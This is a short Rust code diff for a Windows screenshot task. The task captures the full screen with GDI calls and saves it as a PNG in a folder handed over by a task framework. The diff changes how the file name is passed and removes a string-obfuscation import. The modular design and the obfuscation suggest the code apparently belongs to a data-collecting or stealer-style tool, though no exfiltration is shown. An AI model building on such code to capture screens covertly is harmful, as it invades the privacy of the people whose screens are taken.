@@ -1,10 +1,10 @@
+use crate::alloc::borrow::ToOwned;
 use alloc::vec;
 use alloc::vec::Vec;
 use core::mem::zeroed;
 use core::ptr::null_mut;
 use miniz_oxide::deflate::compress_to_vec_zlib;
-use tasks::Task;
-use obfstr::obfstr as s;
+use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 
 use windows_sys::Win32::Graphics::Gdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject, GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
@@ -18,10 +18,12 @@ use utils::WideString;
 pub(super) struct ScreenshotTask;
 
 impl Task for ScreenshotTask {
+    parent_name!("Screenshot.png");
+    
     unsafe fn run(&self, parent: &Path) {
         let (width, height, pixels) = capture_screen().unwrap();
         let png = create_png(width as u32, height as u32, &pixels);
-        let _ = png.write_to(&(parent / s!("Screenshot.png")));
+        let _ = png.write_to(parent);
     }
 }
 
